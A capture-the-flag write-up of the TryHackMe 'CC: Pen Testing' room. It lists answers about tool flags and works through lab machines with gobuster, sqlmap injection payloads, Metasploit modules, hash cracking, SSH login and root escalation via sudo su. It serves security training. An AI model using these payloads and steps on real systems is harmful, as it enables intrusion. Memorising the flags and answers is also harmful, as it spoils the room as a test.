# CC: Pen Testing


## Task 1 Introduction
The idea behind this room is to provide an introduction to various tools and concepts commonly encountered in penetration testing. This room assumes that you have basic linux and networking knowledge. This room is also not meant to be a "be all end all" for penetration testing. The tasks in this room can be completed in any order; however, if you are new to penetration testing, completing the first two sections is recommended before doing anything else.


## Task 2 [Section 1 - Network Utilities] - nmap

1. What does nmap stand for?
```
network mapper
```

2. How do you specify which port(s) to scan?
```
 -p
```

3. How do you do a "ping scan"(just tests if the host(s) is up)?
```
 -sn
```

4. What is the flag for a UDP scan?
```
 -sU
```

5. How do you run default scripts?
```
 -sC
```

6. How do you enable "aggressive mode"(Enables OS detection, version detection, script scanning, and traceroute)
```
 -A
```

7. What flag enables OS detection
```
 -O
```

8. How do you get the versions of services running on the target machine    
```
 -sV
```

9. Deploy the machine
```
export IP=10.10.33.160
```

10. How many ports are open on the machine?    
```
1
```

11. What service is running on the machine?       
```
apache
```

12. What is the version of the service?      
```
 2.4.18
```

13. What is the output of the http-title script(included in default scripts)
```
Apache2 Ubuntu Default Page: It works
```


## Task 3 [Section 1 - Network Utilities] - Netcat
1. How do you listen for connections?
```
 -l
```

2. How do you enable verbose mode(allows you to see who connected to you)?
```
 -v
```

3. How do you specify a port to listen on?
```
 -p
```

4. How do you specify which program to execute after you connect to a host(One of the most infamous)?
```
 -e
```

5. How do you connect to udp ports?
```
 -u
```


## Task 4 [Section 2 - Web Enumeration] - gobuster
1. How do you specify directory/file brute forcing mode?
```
dir
```

2. How do you specify dns bruteforcing mode?
```
dns
```

3. What flag sets extensions to be used?
```
 -x, --extensions
```

4. What flag sets a wordlist to be used?
```
 -w, --wordlist
```

5. How do you set the Username for basic authentication(If the directory requires a username/password)?
```
 -U, --username
```

6. How do you set the password for basic authentication?
```
 -P, --password
```

7. How do you set which status codes gobuster will interpret as valid?
```
 -s, --statuscodes
```

8. How do you skip ssl certificate validation?
```
 -k, --insecuressl
```

9. How do you specify a User-Agent?
```
 -a, --useragent
 ```

10. How do you specify a HTTP header?
```
 -H, --headers
```

11. What flag sets the URL to bruteforce?
```
 -u, --url
```

12. Deploy the machine
```
export IP=10.10.3.54
```

13. What is the name of the hidden directory
```
secret
```

14. What is the name of the hidden file with the extension xxa?
```
password
```  
```bash
jeffrowell@kali:~/Documents/TryHackMe/CC: Pen Testing$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x xxa
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.3.54
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     xxa
[+] Timeout:        10s
===============================================================
2020/05/16 22:59:12 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.xxa (Status: 403)
/.htaccess (Status: 403)
/.htaccess.xxa (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.xxa (Status: 403)
/index.html (Status: 200)
/password.xxa (Status: 200)
/secret (Status: 301)
/server-status (Status: 403)
===============================================================
2020/05/16 23:01:25 Finished
===============================================================
```


## Task 5 [Section 2 - Web Enumeration] - nikto
1. How do you specify which host to use?      
```
 -h
```

2. What flag disables ssl?
```
 -nossl
```

3. How do you force ssl?
```
 -ssl
```

4. How do you specify authentication(username + pass)?
```
 -id
```

5. How do you select which plugin to use?
```
 -plugins
```

6. Which plugin checks if you can enumerate apache users?
```
apacheusers
```

7. How do you update the plugin list?
```
 -update
```

8. How do you list all possible plugins to use?
```
 --list-plugins
```


## Task 6 [Section 3 - Metasploit]: Intro
Metasploit is one of the most popular penetration testing frameworks around. It contains a large database of almost every major CVE, which you can easily use against a machine. The aim of this section is to go through some of the major features of metasploit, and at the end there will be a machine that you will need to exploit.

## Task 7 [Section 3 Metasploit]: Setting Up
1.	What command allows you to search modules?
```
search
```

2.	How to you select a module?    
```
use
```

3.	How do you display information about a specific module?
```
info
```

4.	How do you list options that you can set?
```
options
```

5.	What command lets you view advanced options for a specific module?  
```
advanced
```

6.	How do you show options in a specific category
```
show
```


## Task 8 [Section 3 - Metasploit]: - Selecting a module

1. How do you select the eternalblue module?
```
use exploit/windows/smb/ms17_010_eternalblue
```

2. What option allows you to select the target host(s)?
```
RHOSTS
```

3. How do you set the target port?
```
RPORT
```

4. What command allows you to set options?
```
set
```

5. How would you set SMBPass to "username"?
```
set SMBPass username
```

6. How would you set the SMBUser to "password"?
```
set SMBUser password
```

7. What option sets the architecture to be exploited?
```
arch
```

8. What option sets the payload to be sent to the target machine?
```
payload
```

9. Once you've finished setting all the required options, how do you run the exploit?
```
exploit
```

10. What flag do you set if you want the exploit to run in the background?
```
 -j
```

11. How do you list all current sessions?
```
sessions
```

12. What flag allows you to go into interactive mode with a session("drops you either into a meterpreter or regular shell")
```
 -i
```


## Task 9 [Section 3 - Metasploit]: meterpreter

1. What command allows you to download files from the machine?
```
download
```

2. What command allows you to upload files to the machine?
```
upload
```

3. How do you list all running processes?
```
ps
```

4. How do you change processes on the victim host(Ideally it will allow you to change users and gain the perms associated with that user)
```
migrate
```

5. What command lists files in the current directory on the remote machine?
```
ls
```

6. How do you execute a command on the remote host?
```
execute
```

7. What command starts an interactive shell on the remote host?
```
shell
```

8. How do you find files on the target host(Similar function to the linux command "find")
```
search
```

9. How do you get the output of a file on the remote host?
```
cat
```

10. How do you put a meterpreter shell into "background mode"(allows you to run other msf modules while also keeping the meterpreter shell as a session)?
```
background
```


## Task 10 [Section 3 - Metasploit]: Final Walkthrough
1.	Select the module that needs to be exploited
```
use exploit/multi/http/nostromo_code_exec
```

2.	What variable do you need to set, to select the remote host
```
RHOSTS
```

3.	How do you set the port to 80
```
set RPORT 80
```

4. How do you set listening address(Your machine)
```
LHOST
```

5.	Exploit the machine!


6.	What is the name of the secret directory in the /var/nostromo/htdocs directory?
```
s3cretd1r
```

7.	What are the contents of the file inside of the directory?
```
Woohoo!
```


## Task 11 [Section 4 - Hash Cracking]: Intro
Often times during a pen test, you will gain access to a database. When you investigate the database you will often find a users table, which contains usernames and often [hashed passwords](https://www.wired.com/2016/06/hacker-lexicon-password-hashing/). It is often necessary to know how to crack hashed passwords to gain authentication to a website(or if you're lucky a hashed password may work for ssh!).



## Task 12 [Section 4 - Hash Cracking]: Salting and Formatting
No matter what tool you use, virtually all of them have the exact same format. A file with the hash(s) in it with each hash being separated by a newline.
Example:
```
<hash 1>
<hash 2>
<hash 3>
```
Salts are typically appended onto the hash with a colon and the salt. Files with salted hashes still follow the same convention with each hash being separated by a newline.
Example:
```
<hash1>:<salt>
<hash2>:<salt>
<hash3>:<salt>
```
**Note:** Different hashing algorithms treat salts differently. Some prepend them and some append them. Research what it is you're trying to crack, and make the distinction.


## Task 13 [Section 4 - Hash Cracking]: hashcat


1. What flag sets the mode.
```
 -m
```

2. What flag sets the "attack mode"
```
 -a
```

3. What is the attack mode number for Brute-force    
```
3
```

4. What is the mode number for SHA3-512    
```
17600
```

5. Crack This Hash: `56ab24c15b72a457069c5ea42fcfc640` Type: MD5
```
happy
```

6. Crack this hash: `4bc9ae2b9236c2ad02d81491dcb51d5f` Type: MD4
```
nootnoot
```


## Task 14 [Section 4 - Hash Cracking]: John The Ripper

#1 What flag let's you specify which wordlist to use?
```
 -wordlist
```

#2 What flag lets you specify which hash format(Ex: MD5,SHA1 etc.) to use?    
```
 --format
```

#3 How do you specify which rule to use?
```
 --rules
```

#4 Crack this hash: `5d41402abc4b2a76b9719d911017c592` Type: MD5
```
hello
```

#5 	Crack this hash: `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` Type: SHA1
```
password
```


## Task 15 [Section 5 - SQL Injection]: Intro

SQL injection is the art of modifying a SQL query so you can get access to the target's database. This technique is often used to get user's data such as passwords, emails etc. SQL injection is one of the most common web vulnerabilities, and as such, it is highly worth checking for


## Task 16 [Section 5 - SQL Injection]: sqlmap

1. How do you specify which url to check?
```
 -u
```

2. What about which google dork to use?
```
 -g
 ```

3. How do you select(lol) which parameter to use?(Example: in the url http://ex.com?test=1 the parameter would be test.)
```
 -p
```

4. What flag sets which database is in the target host's backend?(Example: If the flag is set to mysql then sqlmap will only test mysql injections).
```
 --dbms
```

5. How do you select the level of depth sqlmap should use(Higher = more accurate and more tests in general).
```
 --level
```

6. How do you dump the table entries of the database?
```
 --dump
```

7. Which flag sets which db to enumerate? (Case sensitive)
```
 -D
```

8. Which flag sets which table to enumerate? (Case sensitive)
```
 -T
```

9. Which flag sets which column to enumerate? (Case sensitive)
```
 -C
```

10. How do you ask sqlmap to try to get an interactive os-shell?
```
 --os-shell
```

11. What flag dumps all data from every table
```
 --dump-all
```

## Task 17 [Section 5 - SQL Injection]: A Note on Manual SQL Injection
Occasionally you will be unable to use sqlmap. This can be for a variety of reasons, such as a the target has set up a firewall or a request limit. In this case it is worth knowing how to do basic manual SQL Injection, if only to confirm that there is SQL Injection. A list of ways to check for SQL Injection can be found [here](https://owasp.org/www-community/attacks/SQL_Injection).

**Note:** As there are various ways to check for sql injection, and it would be difficult to properly convey how to test for sqli given each situation, there will be no questions for this task.

## Task 18 [Section 5 - SQL Injection]: Vulnerable Web Application
```
export IP=10.10.167.62
```

1. Set the url to the machine ip, and run the command
```bash
jeffrowell@kali:~/Documents/TryHackMe/CC: Pen Testing$ sqlmap -u http://$IP --forms
```

2. How many types of sqli is the site vulnerable too?
```
3
```
```bash
POST parameter 'msg' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 367 HTTP(s) requests:
 ---
Parameter: msg (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: msg=ThVL' RLIKE (SELECT (CASE WHEN (3746=3746) THEN 0x5468564c ELSE 0x28 END))-- bmCH
    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: msg=ThVL' OR (SELECT 3387 FROM(SELECT COUNT(*),CONCAT(0x716b7a7671,(SELECT (ELT(3387=3387,1))),0x717a6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Mtlf
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msg=ThVL' AND (SELECT 2174 FROM (SELECT(SLEEP(5)))EAVn)-- mAaO
 ---
```

3. Dump the database.
```SQL
Database: tests
Table: lol
[1 entry]
 +----------+
 | flag     |
 +----------+
 | found_me |
 +----------+
```
```SQL
Database: tests
Table: msg
[2 entries]
 +------+
 | msg  |
 +------+
 | msg  |
 | test |
 +------+
```

4. What is the name of the database?    
```
tests
```

5. How many tables are in the database?
```
2
```

6. What is the value of the flag?
```
found_me
```


## Task 19 [Section 6 - Samba]: Intro

Most of the pentesting techniques and tools you've seen so far can be used on both Windows and Linux. However, one of the things you'll find most often when pen testing Windows machines is samba, and it is worth making a section dedicated to enumerating it.


Note: Samba is cross platform as well, however this section will primarily be focused on Windows enumeration; some of the techniques you see here still apply to Linux as well.


##  Task 20 [Section 6 - Samba]: smbmap

1. How do you set the username to authenticate with?
```
 -u
```

2. What about the password?   
```
 -p
```

3. How do you set the host?
```
 -H
```

4. What flag runs a command on the server(assuming you have permissions that is)?
```
 -x
```

5. How do you specify the share to enumerate?
```
 -s
```

6. How do you set which domain to enumerate?
```
 -d
```

7. What flag downloads a file?
```
 --download
```

8. What about uploading one?
```
 --upload
```

9. Given the username "admin", the password "password", and the ip "10.10.10.10", how would you run ipconfig on that machine
```
smbmap -u "admin" -p "password" -H 10.10.10.10 -x "ipconfig"
```


## Task 21 [Section 6 - Samba]: smbclient

1. How do you specify which domain(workgroup) to use when connecting to the host?
```
 -W
```

2. How do you specify the ip address of the host?
```
 -I
```

3. How do you run the command "ipconfig" on the target machine?
```
 -c "ipconfig"
```

4. How do you specify the username to authenticate with?
```
 -U
```

5. How do you specify the password to authenticate with?
```
 -P
```

6. What flag is set to tell smbclient to not use a password?
```
 -N
```

7. While in the interactive prompt, how would you download the file test, assuming it was in the current directory?
```
get test
```

8. In the interactive prompt, how would you upload your /etc/hosts file
```
put /etc/hosts
```

## Task 22 [Section 6 - Samba]: A note about impacket

impacket is a collection of extremely useful windows scripts. It is worth mentioning here, as it has many scripts available that use samba to enumerate and even gain shell access to windows machines. All scripts can be found [here](https://github.com/SecureAuthCorp/impacket).

**Note:** impacket has scripts that use other protocols and services besides samba.


## Task 23 [Miscellaneous]: A note on privilege escalation

privilege escalation is such a large topic that it would be impossible to do it proper justice in this type of room. However, it is a necessary topic that must be covered, so rather than making a task with questions, I shall provide you all with some resources.

General:
* [A bunch of tools and payloads for every stage of pentesting](https://github.com/swisskyrepo/PayloadsAllTheThings)


Linux:
* [a bit old but still worth looking at](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

* [One of the most popular priv esc scripts](https://github.com/rebootuser/LinEnum)

* [Another popular script](https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh)

* [A Script that's dedicated to searching for kernel exploits](https://github.com/mzet-/linux-exploit-suggester)

* [I can not overstate the usefulness of this for priv esc, if a common binary has special permissions, you can use this site to see how to get root perms with it.](https://gtfobins.github.io)


Windows:

* [Dictates some very useful commands and methods to enumerate the host and gain intel](https://www.fuzzysecurity.com/tutorials/16.html)

* [A bit old but still an incredibly useful script](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp)

* [A general enumeration script](https://github.com/411Hall/JAWS)


## Task 24 [Section 7 - Final Exam]: Good Luck :D
```
export IP=10.10.191.56
```

1. What is the user.txt     
```
supernootnoot
```      
Recon:
```bash
jeffrowell@kali:~/Documents/TryHackMe/CC: Pen Testing$ sudo nmap -sC -sV -Pn -n -O $IP -oN nmap/initial.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-16 16:55 MDT
Nmap scan report for 10.10.191.56
Host is up (0.14s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 12:96:a6:1e:81:73:ae:17:4c:e1:7c:63:78:3c:71:1c (RSA)
|   256 6d:9c:f2:07:11:d2:aa:19:99:90:bb:ec:6b:a1:53:77 (ECDSA)
|_  256 0e:a5:fa:ce:f2:ad:e6:fa:99:f3:92:5f:87:bb:ba:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=5/16%OT=22%CT=1%CU=33921%PV=Y%DS=2%DC=I%G=Y%TM=5EC06F6
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1
OS:1NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.82 seconds
```
```bash
jeffrowell@kali:~/Documents/TryHackMe/CC: Pen Testing/nikto.txt$ gobuster dir -u http://$IP/secret/ -w /usr/share/wordlists/dirb/common.txt -x txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.191.56/secret/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt
[+] Timeout:        10s
===============================================================
2020/05/17 00:16:01 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.txt (Status: 403)
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/index.html (Status: 200)
/secret.txt (Status: 200)
===============================================================
2020/05/17 00:18:13 Finished
===============================================================
jeffrowell@kali:~/Documents/TryHackMe/CC: Pen Testing/nikto.txt$ curl $IP/secret/secret.txt
nyan:046385855FC9580393853D8E81F240B66FE9A7B8
jeffrowell@kali:~/Documents/TryHackMe/CC: Pen Testing/nikto.txt$ curl $IP/secret/secret.txt | tee user_hash
jeffrowell@kali:~/Documents/TryHackMe/CC: Pen Testing$ cat user_hash
nyan:046385855FC9580393853D8E81F240B66FE9A7B8
jeffrowell@kali:~/Documents/TryHackMe/CC: Pen Testing$ /opt/JohnTheRipper/run/john user_hash --format=raw-sha1
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=8
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
nyan             (nyan)
1g 0:00:00:01 DONE 1/3 (2020-05-17 00:25) 0.9174g/s 1.834p/s 1.834c/s 1.834C/s nyan..Nyan
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed
```
Now that we have a username and password, we can ssh into the box and look for the flag:
```bash
nyan@ubuntu:~$ ls
user.txt
nyan@ubuntu:~$ cat user.txt
supernootnoot
nyan@ubuntu:~$
```

2. What is the root.txt
```
congratulations!!!!
```
```bash
nyan@ubuntu:~$ sudo -l
Matching Defaults entries for nyan on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User nyan may run the following commands on ubuntu:
    (root) NOPASSWD: /bin/su
nyan@ubuntu:~$ sudo su
root@ubuntu:/home/nyan# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/home/nyan# cd /root
root@ubuntu:~# ls
root.txt
root@ubuntu:~# cat root.txt
congratulations!!!!
```
